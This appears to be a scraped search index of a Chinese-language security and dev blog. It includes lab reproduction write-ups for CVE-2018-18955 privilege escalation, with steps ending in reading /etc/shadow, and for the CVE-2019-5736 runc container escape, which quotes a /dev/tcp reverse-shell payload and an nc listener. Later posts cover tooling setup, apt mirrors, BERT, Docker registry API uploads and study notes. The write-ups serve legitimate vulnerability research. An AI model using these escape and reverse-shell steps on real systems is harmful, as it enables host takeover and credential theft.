Ubuntu 18.04 Docker 20.10 No further kernel modifications are needed because all Ubuntu distributions prior to 18.10 have this vulnerable kernel. Local EscalationInstall newuidmap 1apt-get install uidmap Compile exp 12gcc -o subuid_shell subuid_shell.cgcc -o subshell subshell.c Execute IN THE SAME TERMINAL: 123./subuid_shell# or ./subshellcat /etc/shadow Container Escalation环境搭建拉取编译好的镜像 1sudo docker pull iridium191/cve-2018-18955 Exploit运行容器 1sudo docker run -it --rm --name=18955 --security-opt seccomp=unconfined --cap-add sys_admin iridium191/cve-2018-18955:latest /bin/bash 进入容器后 1./subuid_shell 即完成容器内提权.","tags":["Docker"],"categories":["CVEs","Writeup"]},{"title":"CVE-2019-5736 复现writeup","path":"/2024/04/6bebfe1479d2.html","content":"NOTE For all exploit source code and more detailed information, see https://github.com/iridium-soda/container-escape-exploits . 漏洞分析网上有很多相关内容,不再赘述. 环境准备 Ubuntu 18.04 metarget 另一台机器 环境搭建123sudo ./metarget cnv install cve-2019-5736sudo apt install golang-gogo version 准备poc1git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git 监听机器用ifconfig查看IP地址,并用netcat监听反弹shell 1nc -lvnp 7429 编辑main.go,payload中填入监听机器的IP和端口 123456789101112131415161718//...func init() { flag.StringVar(&amp;shellCmd, \"shell\", \"\", \"Execute arbitrary commands\") flag.Parse()}func main() { // This is the line of shell commands that will execute on the host var payload = \"#!/bin/bash bash -i &gt;&amp; /dev/tcp/&lt;attacker's ip&gt;/2333 0&gt;&amp;1\" // First we overwrite /bin/sh with the /proc/self/exe interpreter path fd, err := os.Create(\"/bin/sh\") if err != nil { fmt.Println(err) return }//... } 编译poc 1sudo CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go 由于需要手动改源码,需要在poc编译完成后手动编译Dockerfile 1sudo docker build -t 5736 . Exploit运行exp 12sudo docker run -it --rm --name 2019-5736 5736 /bin/bash./main 在host的另一个tab上: 1sudo docker exec -it 2019-5736 /bin/sh 如果逃逸成功,会看到下面的信息: 1No help topic for '/bin/sh' 监听机器即可收到反弹shell Tips 反复复现可能会导致包破损。用sudo dpkg --configure -a修复 Shell12sudo docker run -it --rm --name 2019-5736 5736 /bin/bash./main Listening 1nc -lvnp 7429 Another tab 1sudo docker exec -it 2019-5736 /bin/sh","tags":["Docker"],"categories":["CVEs","Writeup"]},{"title":"在Ubuntu16.04上初始化metarget环境","path":"/2024/03/bddd1ddf689b.html","content":"Intrometarget ,是一个自动构建易受攻击基础设施的框架。它使得安全研究人员能够快速且自动地部署简单或复杂的易受攻击的云原生目标环境。Metarget支持安装像软件一样的漏洞，例如，通过简单的命令安装包含特定CVE漏洞的Docker、Kubernetes等。此项目旨在为安全研究提供易受攻击的场景，并不推荐在互联网上部署Metarget构建的组件或场景​。以上内容来自ChatGPT。虽然已经近两年没有新release了并且由于网络资源的迭代更新很多上古漏洞的源已经失效了，但复现一些CVE必须要使用这个项目。另外在一些比较老的操作系统发行版上（Ubuntu16.04）过于老旧的python环境和内核版本都为运行metarget造成了困难。本文包括下面的内容： 解决apt初始化的问题 python3.5-&gt;python3.9 openssl1.0.2-&gt;openssl3.2.0 想到再加 apt初始化进入系统换USTC源，执行apt update，报： 1Error in appstreamcli: double free or corruption 这里是16.04缺少appstreamcli，按照下面的方式安装配置即可 12sudo apt install appstream/xenial-backportssudo appstreamcli refresh –force 然后再apt update 升级Python由于metarget在内置的python3.5版本下完全无法运行（缺少对于f''的支持等等），所以需要升级到python3.9。而网上 常用的ppa源(ppa:deadsnakes/ppa)直接apt安装的方式由于ppa源已经停止对16.04的支持，已经无法使用。所以只能使用编译源码的方式。这里参考 1234567sudo apt install -y wget build-essential libreadline-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev libffi-dev zlib1g-devsudo apt update wget https://www.python.org/ftp/python/3.9.13/Python-3.9.13.tgztar xf Python-3.9.13.tgzcd Python-3.9.13/./configure --prefix=/usr/local/python3 --enable-optimizationssudo make &amp;&amp; sudo make install 接下来将软连接转移到新编译的3.9中，注意原有的3.5不要删除否则会造成严重的系统问题 12345mv /usr/bin/python3 /usr/bin/python3.bak#添加python3的软链接ln -s /usr/local/python3/bin/python3 /usr/bin/python3#测试是否安装成功了python3 -V 升级openssl报ImportError: urllib3 v2.0 only supports OpenSSL 1.1.1+,显然是16.04的内置openssl版本太低导致的，重新编译源码更新（参考 ）： 123456wget --no-check-certificate https://www.openssl.org/source/openssl-3.2.0t.tar.gztar -zxvf openssl-3.2.0t.tar.gzcd openssl-3.2.0/./config --prefix=/usr/local/my_opensslmakemake install 接下来转移libssl.so.3 1ls /usr/local/openssl/lib64 应该可以在这里找到 然后编辑/etc/ld.so.conf,把这个路径加进去 刷新配置： 1sudo ldconfig 应该就可以了。 12root@ubuntu:~# openssl versionOpenSSL 3.2.0 23 Nov 2023 (Library: OpenSSL 3.2.0 23 Nov 2023) 但python还没有链接上… 123import sslprint(ssl.OPENSSL_VERSION)print(ssl._ssl.__file__)","tags":["metarget"]},{"title":"install_bcc","path":"/2024/02/6c16bc3f09a4.html","content":"在干净的Ubuntu系统上安装BCC并进行测试. Ref https://github.com/iovisor/bcc/blob/master/INSTALL.md#ubuntu---source 环境 Ubuntu 22.04 4GB RAM or above StepsPrep安装依赖 123apt install -y zip bison build-essential cmake flex git libedit-dev \\ libllvm14 llvm-14-dev libclang-14-dev python3 zlib1g-dev libelf-dev libfl-dev python3-setuptools \\ liblzma-dev libdebuginfod-dev arping netperf iperf 测试 123cmake --versiongcc --versiong++ --version 切换python为python3 1apt install python-is-python3 Compile12345678910git clone https://github.com/iovisor/bcc.gitmkdir bcc/build; cd bcc/buildcmake ..makesudo make installcmake -DPYTHON_CMD=python3 .. # build python3 bindingpushd src/python/makesudo make installpopd 如果安装正常,应该能在usr/share/bcc目录下看到tools目录 Test123cd /usr/share/bcc/toolssudo ./cachestat 1 3sudo ./execsnoop Update可以使用这里的一键脚本：https://github.com/seclab-stonybrook/eaudit/blob/master/bcc_install.sh 1234567891011121314151617181920fatal() { echo \"BCC installation failed at the following step: $1\" exit 1}sudo apt update || fatal \"apt update\"sudo apt install -y zip bison build-essential cmake flex git libedit-dev \\ libllvm14 llvm-14-dev libclang-14-dev python3 zlib1g-dev libelf-dev libfl-dev \\ python3-setuptools liblzma-dev libdebuginfod-dev \\ || fatal \"apt install (of required development packages)\"mkdir src || fatal \"mkdir\"cd srcgit clone https://github.com/iovisor/bcc.git || fatal \"cloning BCC source from iovisor\"mkdir bcc/build; cd bcc/build cmake .. || fatal \"cmake\"make || fatal \"Building BCC from source\"sudo make install || fatal \"installing BCC\"cmake -DPYTHON_CMD=python3 .. || fatal \"building python3 bindings\"pushd src/python/( make &amp;&amp; sudo make install ) || fatal \"installing python bindings\"","categories":["eBPF"]},{"title":"apt_source_of_ubuntu22.04","path":"/2024/02/9139c7907d88.html","content":"Refs https://wph.im/213.html 修改source.list之前复制备份原来的配置文件 1mv /etc/apt/sources.list /etc/apt/sources.list.bak 新建一个sources.list 1vi /etc/apt/sources.list 修改完成后 1apt update 常用的apt源Official source仅境外服务器使用 123456789101112131415deb http://archive.ubuntu.com/ubuntu/ jammy main restricted universe multiversedeb-src http://archive.ubuntu.com/ubuntu/ jammy main restricted universe multiversedeb http://archive.ubuntu.com/ubuntu/ jammy-security main restricted universe multiversedeb-src http://archive.ubuntu.com/ubuntu/ jammy-security main restricted universe multiversedeb http://archive.ubuntu.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src http://archive.ubuntu.com/ubuntu/ jammy-updates main restricted universe multiversedeb http://archive.ubuntu.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src http://archive.ubuntu.com/ubuntu/ jammy-backports main restricted universe multiverse## Not recommended# deb http://archive.ubuntu.com/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src http://archive.ubuntu.com/ubuntu/ jammy-proposed main restricted universe multiverse Tencent CloudExternal source123456789101112131415deb https://mirrors.cloud.tencent.com/ubuntu/ jammy main restricted universe multiversedeb-src https://mirrors.cloud.tencent.com/ubuntu/ jammy main restricted universe multiversedeb https://mirrors.cloud.tencent.com/ubuntu/ jammy-security main restricted universe multiversedeb-src https://mirrors.cloud.tencent.com/ubuntu/ jammy-security main restricted universe multiversedeb https://mirrors.cloud.tencent.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src https://mirrors.cloud.tencent.com/ubuntu/ jammy-updates main restricted universe multiversedeb https://mirrors.cloud.tencent.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src https://mirrors.cloud.tencent.com/ubuntu/ jammy-backports main restricted universe multiverse## Not recommended# deb https://mirrors.cloud.tencent.com/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src https://mirrors.cloud.tencent.com/ubuntu/ jammy-proposed main restricted universe multiverse Internal source123456789101112131415deb http://mirrors.tencentyun.com/ubuntu/ jammy main restricted universe multiversedeb-src http://mirrors.tencentyun.com/ubuntu/ jammy main restricted universe multiversedeb http://mirrors.tencentyun.com/ubuntu/ jammy-security main restricted universe multiversedeb-src http://mirrors.tencentyun.com/ubuntu/ jammy-security main restricted universe multiversedeb http://mirrors.tencentyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src http://mirrors.tencentyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb http://mirrors.tencentyun.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src http://mirrors.tencentyun.com/ubuntu/ jammy-backports main restricted universe multiverse## Not recommended# deb http://mirrors.tencentyun.com/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src http://mirrors.tencentyun.com/ubuntu/ jammy-proposed main restricted universe multiverse Tsinghua source123456789101112131415deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse## Not recommended# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse USTC source123456789101112131415deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse## Not recommended# deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse Ali source123456789101112131415deb https://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb-src https://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb https://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb-src https://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb https://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src https://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb https://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src https://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse## Not recommended# deb https://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src https://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse","categories":["MISC"]},{"title":"BERT-Service-0-to-1","path":"/2023/09/b2652742e65a.html","content":"DescriptionBERT（Bidirectional Encoder Representations from Transformers）是一种预训练的自然语言处理模型，由Google在2018年提出。它基于Transformer架构，并通过在大规模文本语料上进行无监督训练来学习通用的语言表示。 BERT的主要特点是双向性（Bidirectional），它能够同时利用上下文信息来理解单词的含义。传统的语言模型（如GPT）只能根据前面的单词来预测下一个单词，而BERT可以同时考虑前面和后面的单词，从而更好地捕捉上下文信息。 BERT的训练过程包括两个阶段：预训练和微调。在预训练阶段，BERT使用大规模的无标签文本数据来学习语言表示。它通过掩码语言建模（Masked Language Modeling）和下一句预测（Next Sentence Prediction）任务来训练模型。在掩码语言建模任务中，BERT会随机掩盖输入句子中的一些单词，然后预测这些被掩盖的单词。在下一句预测任务中，BERT会判断两个句子是否是连续的。 在微调阶段，BERT的预训练模型会在特定的下游任务上进行微调，例如文本分类、命名实体识别、问答等。通过微调，BERT可以根据具体任务的标注数据来调整模型参数，使其更好地适应特定任务的要求。 BERT在自然语言处理领域取得了重大的突破，它在多项基准测试中取得了领先的性能。由于BERT能够学习到通用的语言表示，它可以应用于各种文本处理任务，包括文本分类、命名实体识别、情感分析、机器翻译等。 我们使用BERT的向量化功能，将各种dockerhub上的description转化为向量并进行bi-Kmeans聚类分析。 Resources BERT-as-service git repo: https://github.com/hansonrobotics/bert-as-service https://cloud.tencent.com/developer/article/1886981 https://zhuanlan.zhihu.com/p/50582974 Environments Windows11 Professional x64 Python 3.10(Global) Reqiurements Python 3.6 or 3.7 Tensorflow==1.15.0 InstallationsInstall &amp; Configure VenvTo create an isolated and clean environment, we use acconda to create venv. Download acconda at https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive Install Add installation path to PATH: setx PATH \"%PATH%;C:\\path\\to\\anaconda\" Setup a venv: conda create -n venv python=3.7 Use tsinghua mirror to acclerate downloading: conda config --add channels https://mirrors.tuna.tsinghua.edu.cn Activate venv: activate venv Test: python --version and pip --version Install Dependencies Config pip mirror: pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple Install Tensorflow==1.15.0: pip install tensorflow==1.15.0 python安装模块的时候出现了不能连接的问题：after connection broken by ‘ProxyError’: 关掉梯子 踩坑：python - TypeError: Descriptors cannot not be created directly - Stack Overflow Install service：pip install bert-serving-client bert-serving-server Download pre-trained model at https://github.com/google-research/bert Activate server：bert-serving-start -model_dir v:\\Dev\\metadata-analysis-framework\\BERT_model -num_worker=1 Test1234567from bert_serving.client import BertClient #导入客户端bc = BertClient() # 创建客户端对象result = bc.encode(['你好', '我来自中国', '中国是一个历史悠久、文化底蕴深厚的国家'])print(result.shape) # 查看输出结果shape","tags":["BERT"],"categories":["AI"]},{"title":"how-to-upload-images-via-API","path":"/2023/07/1c85f5f8cd37.html","content":"Description描述如何使用dockerhub提供的API V2上传镜像，而不经过docker Reference： https://docs.docker.com/registry/spec/api/#pushing-an-image https://forums.docker.com/t/401-unauthorized-when-pushing-an-image-layer-to-dockerhub/34832 http://web.archive.org/web/20180926062602/https://gist.github.com/jlhawn/8f218e7c0b14c941c41f https://gist.github.com/alex-bender/55fefa42f47ca4e3013a8c51afa8f3d2 StepsAuth首先需要验证账号和密码。具体格式是base64($username:$password)。编码后的结果应当作为下一步的请求头 在获得正确的base64编码之后，应当向https://auth.docker.io/token?service=registry.docker.io&amp;scope=repository:$reponame:$actions\" 发送请求，其中$reponame:$actions为要访问的repo名称+请求的权限（一般是\"push,pull\"） Overview要对dockerhub推送镜像，需要认证用户。在之后需要先逐层推送，然后上传manifest。 Auth1234567891011121314151617181920UNAME=\"\"UPASS=\"\"TARPATH=\"test/85e601059a16cdd58f9b02de2c34b30f19464bc60e848da43b7daf5b1b1c2a8c/layer.tar\"getToken() { local reponame=$1 local actions=$2 local headers local response if [ -n \"$UNAME\" ]; then headers=\"Authorization: Basic $(echo -n \"${UNAME}:${UPASS}\" | base64)\" fi response=$(curl -s -H \"$headers\" \"https://auth.docker.io/token?service=registry.docker.io&amp;scope=repository:$reponame:$actions\") echo $response | jq '.token' | xargs echo } 这里response返回一个对于该repo的token…? Push layers推送一个镜像层分两步：第一步通过下面的请求提起一个upload流程并获取一个URL 1POST /v2/&lt;name&gt;/blobs/uploads/ name: 镜像所属的namespace，通常为用户名。 返回的示例如下： 1234567891011$ curl -X POST -I 192.168.1.103:8021/v2/library/registry/blobs/uploads/HTTP/1.1 202 AcceptedServer: nginx/1.11.5Date: Thu, 13 Sep 2018 11:05:26 GMTContent-Type: text/plain; charset=utf-8Content-Length: 0Connection: keep-aliveDocker-Distribution-Api-Version: registry/2.0Docker-Upload-Uuid: 91cbb0a1-c335-45ae-b155-86bf06897d9dLocation: http://192.168.1.103:8021/v2/library/registry/blobs/uploads/91cbb0a1-c335-45ae-b155-86bf06897d9d?_state=YeQZM_9WTPi9Gxfgi6chPo7gZ0fRsJisqthEwHrrmTl7Ik5hbWUiOiJsaWJyYXJ5L3JlZ2lzdHJ5IiwiVVVJRCI6IjkxY2JiMGExLWMzMzUtNDVhZS1iMTU1LTg2YmYwNjg5N2Q5ZCIsIk9mZnNldCI6MCwiU3RhcnRlZEF0IjoiMjAxOC0wOS0xM1QxMTowNToyNi45NzI2MjE4ODhaIn0%3DRange: 0-0 这里Location即为下一步上传layer需要的的URL Chcek existance1HEAD /v2/&lt;name&gt;/blobs/&lt;digest&gt; digest: 镜像层的sha256摘要 如果该层存在则会返回： 123200 OKContent-Length: &lt;length of blob&gt;Docker-Content-Digest: &lt;digest&gt; 这时候不需要再次上传该层。有时候在之前的tag中上传过，也会提示存在。 这个检测范围有多少？如果是同一个人别的镜像呢？如果是别人的镜像呢？更离谱，别人的私人镜像呢？ Pushing layer1POST /v2/&lt;name&gt;/blobs/uploads/ 这里调用上面得到的URL，用PUT方法，例如： 1curl -X PUT -H \"Content-Type: application/octet-stream\" -H -I --upload-file /root/image/layers/06ba8e23299fcf9dd9efb3c5acd4c9d03badac5392953001c75d38197113a63a.tar.gz http://192.168.1.103:8021/v2/library/registry/blobs/uploads/91cbb0a1-c335-45ae-b155-86bf06897d9d?_state=YeQZM_9WTPi9Gxfgi6chPo7gZ0fRsJisqthEwHrrmTl7Ik5hbWUiOiJsaWJyYXJ5L3JlZ2lzdHJ5IiwiVVVJRCI6IjkxY2JiMGExLWMzMzUtNDVhZS1iMTU1LTg2YmYwNjg5N2Q5ZCIsIk9mZnNldCI6MCwiU3RhcnRlZEF0IjoiMjAxOC0wOS0xM1QxMTowNToyNi45NzI2MjE4ODhaIn0%3D\\&amp;digest=sha256:06ba8e23299fcf9dd9efb3c5acd4c9d03badac5392953001c75d38197113a63a 如果成功会返回Code201 当docker push在上传镜像的时候，如果一个repository有两个tag，那么上传第二个tag时，重复的layer就不会上传。但如果两个镜像的repository不一样，那么即使它们有重复的layer，也会各自上传一次。","tags":["Docker","Dockerhub"],"categories":["Cloud","Docker"]},{"title":"Function-level Vulnerability Detection by Deep Learning: How Far Are We?","path":"/2023/07/4afd9455dade.html","content":"Abstract 评估了现有的5大类11种代表性的基于深度学习的漏洞检测模型（即基于标记的、基于树的、基于图的和预训练的） 提出5种指标评估模型的效果 预训练模型和卷积神经网络通常优于其他模型和网络 泛化性：预训练由于数据来源更广泛，效果更好 互补性：模型之间可以互相补充检测结果 鲁棒性：随着代码突变，检测能力降低 扩展性：卷积网络检测时间更短 打包了11个模型并统一了接口 IntroModels categories Tree based: AstGRU:分析函数的AST，并进行遍历搜索，将复杂的树结构转换为普通序列 Graph based: Vul-CNN: 提取函数的依赖图PDG，然后通过社交网络中心性分析将其转换为图像。收集到图像后，使用CNN进行漏洞检测 Social network centrality analysis是一种社交网络分析方法，用于研究社交网络中节点（即个人或组织）的重要性或影响力。 Graph based: Devign： 提取代码属性图(CPG),应用图神经网络GNN检测漏洞 Contribution在同一的数据集上比较这些检测工具。参与比较的有： Token based TextCNN LSTM GRU AST based Code2Vec AstGRU Graph based VulCNN Devign Reveal Pre-train Bert Codebert VulBERTa 实验结果： Effectiveness CNN &gt; Others Pre-train &gt; Others Generalizability Pre-train &gt; Others Complementarity Graph based + Pre train = ↑ LSTM + TextCNN CodeBERT + VulBERTa Robustness Pre train √ AST based ×：破坏了AST结构 Scalability CNN √ Graph based / Pre train ×：参数和操作较多 How Vulnerability Detections workTrain stage Pre-processing: Code to structed data: AST, PDG, CFG; Extract features: 提取了可用于训练的特征向量;词嵌入、AST路径嵌入、图嵌入 Training：输入：上一步提取的特征向量 输出：softmax函数输出的预测分布 Detection stage 对测试集的样本以相同方式进行预处理和特征提取 发送至模型，预测样本是否存在漏洞 Models, datasets and Evaluation metricsModelsToken based TextCNN：基于CNN，进行少量调参并使用静态词向量，就能获得较好的文本分类性能。 LSTM：基于RNN，解决了梯度消失和梯度爆炸。当用作文本分类器时，可以有效地捕获文本上下文词之间的关联属性，并通过其遗忘门结构过滤无效信息。 梯度消失和梯度爆炸 梯度消失和梯度爆炸是深度神经网络在训练过程中常见的问题。两者都与深度神经网络中的反向传播算法有关。 梯度消失：在深度神经网络中，反向传播算法通过计算损失函数对每个权重参数的偏导数来更新参数。当网络层数增加时，反向传播算法的梯度会在每一层中逐渐变小，最终可能会变得非常小，导致参数更新变得非常缓慢或停滞不前。这种现象称为梯度消失。 梯度爆炸：与梯度消失相反，梯度爆炸是指在反向传播算法中，梯度值变得非常大，导致参数更新变得非常快，甚至出现参数值溢出的情况。这种现象称为梯度爆炸。 梯度消失和梯度爆炸都会影响深度神经网络的训练效果和收敛速度。梯度消失通常发生在深度循环神经网络（RNN）等网络中，而梯度爆炸通常发生在卷积神经网络（CNN）等网络中。为了避免梯度消失和梯度爆炸的影响，通常采用一些技巧和方法，例如使用不同的激活函数、归一化技术（如Batch Normalization）、梯度裁剪等，以提高网络的稳定性和训练效果。 GRU：和LSTM类似，没有输出门，参数更少 AST based Code2vec 代码分解为AST的路径集合 模型学习每条路径的原子表示，以及如何聚合多个语法路径 基于AST预测可能的方法名称 ASTGRU：双门控循环单元 (Bi-GRU) 网络 源代码由向量表示，保留了所有语法特征但减少了不必要的数据冗余 使用Bi-GRU学习漏洞特征，并打包填充方法，使得Bi-GRU可以处理长度不等的数据 建立在基于SARD的Juliet的数据集上，这个数据集具有较好的质量 Bi-GRU Bi-GRU是一种双向门控循环单元（Bidirectional Gated Recurrent Unit）神经网络，是循环神经网络（RNN）的一种变种。与标准的GRU相比，Bi-GRU具有双向性，可以同时考虑前向和后向的上下文信息。 在Bi-GRU中，输入数据序列首先被分别输入到前向和后向的两个GRU层中，每个GRU层包含一个隐藏状态向量，可以通过门控机制来控制信息的流动。前向GRU层从前向后处理输入序列，后向GRU层则从后向前处理输入序列。两个GRU层的输出在每个时间步骤上通过一个合并层进行拼接。这种结构可以有效地捕获输入序列中的上下文信息，从而提高模型的性能。 Bi-GRU广泛应用于自然语言处理（NLP）任务中，例如文本分类、机器翻译、命名实体识别等。它可以捕获单词或字符级别的上下文信息，以更好地理解和处理自然语言文本中的语义和语法结构。 Graph based VulCNN： 程序语义提取为程序依赖图PDG 对PDG执行社交网络中心性分析，转换为图像 图像送入CNN More scalable PDG 程序依赖图是指程序中各个元素之间的依赖关系所构成的图形结构。程序依赖图可以描述程序中各个模块或变量之间的依赖关系，包括数据依赖、控制依赖和调用依赖等。 数据依赖是指程序中某个变量的值依赖于另一个变量的值，或者某个计算的结果依赖于前面的计算结果。例如，在一个数值计算程序中，某个变量的值可能依赖于前面计算的结果，或者依赖于另一个变量的值。 控制依赖是指程序中某个语句或代码块的执行取决于另一个语句或代码块的执行结果。例如，程序中的if-else语句和循环语句就是典型的控制依赖结构。 调用依赖是指程序中一个函数或方法的执行依赖于另一个函数或方法的执行结果。例如，在一个程序中，某个函数可能会调用另一个函数来完成某些任务，这就构成了调用依赖关系。 通过构建程序依赖图，可以对程序的结构和执行过程进行分析和优化。程序依赖图可以帮助开发人员理解程序中各个元素之间的关系，发现潜在的性能瓶颈和安全漏洞，并进行程序的重构和优化。 Devign 基于图神经网络的模型 学习代码的语义表示并进行图分类 基于手动标记的数据集，具有更好的复杂性和真实性多样性 Pre-trained预训练模型通常在大型开源语料库上进行预训练，以学习语法和语义的深度表示。 BERT：一种预训练模型，它使用一个额外的输出层进行微调，以便在大量句子级和标签级任务上表现良好。 CodeBERT：BRT的扩展，是一种编程语言和自然语言的双峰预训练模型 VulBERTa:已经在大量开源C/C++环境中进行预训练，在cpp领域表现良好 ResultsPotential threats","tags":["AI","Vulnerability detection"],"categories":["Papers Read","AI"]},{"title":"logic-and-thinkstyle","path":"/2023/07/254ef5dc41a2.html","content":"Resource为什么感觉中国人月薪过万很普遍了？ - 墨子连山说职场的回答 - 知乎https://www.zhihu.com/question/309415265/answer/3108644266 Excerpts20多年前，我硕士刚毕业，进了AMSL的算法组，在埃因霍温总部。组长是位荷兰大叔，他一周为ASML工作4天，剩下1天在自己的实验室做研究。此外大叔还是某权威期刊的主编，工作起来基本就是审论文的范。我刚进组第一次作报告，讲话习惯以“I think……”开头。结果没说两句就被打断，荷兰叔一副忍无可忍的样子。告诉我，你不需要“认为”，你只需要“定义”，“量化”，“推导”和“证明”。自此之后我便开始了长达半年的“逻辑炼狱”生活。开会随时会被底下人打断，他们总是那么自然而然地问出，诸如“how do you define”，或者“how do you prove”之类问题。不光是我，其实没有一个人能够毫发无损地离开讲台，每次下来后背必然湿透，因此这玩意也有了一个形象的名字，“sweating talk”。为了不被晾在台上，我不得不提前一周准备报告。准备过程中则不停追问每一个概念的确切定义，google一层便会发现更多模糊概念，然后继续google。直至抵达概念的边界，再追问下去是混沌系统了才会停止。也习惯了对所有公式用两种甚至三种方式进行推导，通过不同路径对数字进行进行校验。对于那些明显反直觉的矛盾会尤其小心，因为一旦出错便显得格外愚蠢。不但自己准备，对同事的报告也要详细了解，毕竟我也需要在台下提出质疑。而我必须保证自己的问题一阵见血，否则当人家反驳你说“not even a question”，你会从此社死。压力之大，甚至会让我连续失眠几天。可逐渐地当我适应了这种方式，反而开始感到无比轻松。就好比近视眼带上了眼睛，原本浑浊不堪的世界变得清澈见底。澄澈地思维让我开始心里有底，仿佛整个人终于找到了立足点，每走一步心里都格外踏实。后来回国的我也逐渐地也走上了管理岗位。当我第一次听团队汇报时，终于体会到了当年荷兰叔的烦躁。可我发现对于很多人而言，运用逻辑似乎很难。面对着数据表，他们依然习惯于“我觉得”。他们不但认知世界全靠“我觉得”，而且为了证明“我觉得”正确，还会不自觉地挑选那些对自己观点有利的案例，即便这种案例在统计样本中凤毛麟角。他们总是以“我身边”，“我朋友”，“我亲戚”作为证据，而14亿的样本总量则视若无睹。即便统计数字跟他们的“我觉得”直接矛盾，他们还是会一根筋地相信。他们相信虚无缥缈的“我觉得”远胜实打实摆在眼前的数字。他们的“我觉得”还可以肆意妄为地使用概念，而根本不在乎概念的定义究竟是什么。他们从不会google或者百度任何概念，而是想到什么张嘴就来，完全不担心搞错定义显得极其愚蠢。当他们说“我觉得”时，似乎也根本没打算让别人听懂，甚至他们自己都根本没打算弄明白。与解决问题相比，他们期待更多地反而是一场抬杠，当然他们美其名曰“辩论”。当你规劝他们以逻辑的方式进行表达时，他们反而会高高在上地说，你太理性，不懂我这种“感性”。可究竟什么才是感性？他们自然说不清楚，总之一拍脑袋“我觉得”就是“感性”。对于这些“感性”的人，你能怎么办？陪着他“感性”？那就变成了两个人各自拍脑袋，拍来拍去最终还是各自“觉得”，问题依然摆在那里。也有人批评我，说难道就非要理性，感性就不对吗？我劝他们，如果你自己都不知道究竟什么叫“感性”，是不是就少说这种模棱两可的话。毕竟我们活在现实中是要解决问题的，究竟哪个对，咱们还是理性点，看疗效吧。","tags":["Critical thinking"],"categories":["Excerpt"]},{"title":"动手学深度学习v2-线性代数","path":"/2023/07/86dfd3fdd9ed.html","content":"Description该博文为动手学深度学习v2-线性代数 配套笔记 Notes范数矩阵的范数是衡量矩阵“大小”的标量。Frobenius范数：Frobenius范数是将矩阵中每个元素的平方和的平方根。对于一个行列的矩阵，它的Frobenius范数为 即将矩阵每一个元素的平方求和再开根号（有点像求向量长度的矩阵版） 正定、正交、置换矩阵正定： 正交：每一列都是单位长度，且互相正交 特征向量和特征值对称矩阵总是有特征向量 特征向量即不被矩阵改变方向的向量，只改变长度；前后长度的比例就是特征值 Implementations标量，向量，矩阵1234567x=torch.tensor([1.0])#标量y=torch.tensor([1.0,2.0,3.0,4.0])#向量y.shape #只有一个元素，因为只有一个轴A=y.reshape(2,2)#向量转矩阵A.T#转置A*B#矩阵按元素乘A.sum()#元素和 降维12345A_sum_axis0 = A.sum(axis=0)# 对某轴求和降维A.sum(axis=[0, 1]) # 对行求和之后对列求和A.mean(), A.sum() / A.numel()# 求平均sum_A = A.sum(axis=1, keepdims=True)#求和但不降维 矩阵点积、向量积、矩阵乘法点积： 1torch.sum(x * y)# 通过执行按元素乘法，然后进行求和来表示两个向量的点积 向量积：使用torch.mv 1torch.mv(A, x) 矩阵乘法： 1torch.mm(A, B) L2范数$$||x||2=\\sqrt(\\sum x{(i,j)}^2)$$ 123u = torch.tensor([3.0, -4.0])torch.norm(u)torch.abs(u).sum()# L1范数 在机器学习中，范数用于量化预测值和检验集结果之间的距离,以进行优化.","tags":["Linear algebra"],"categories":["Machine 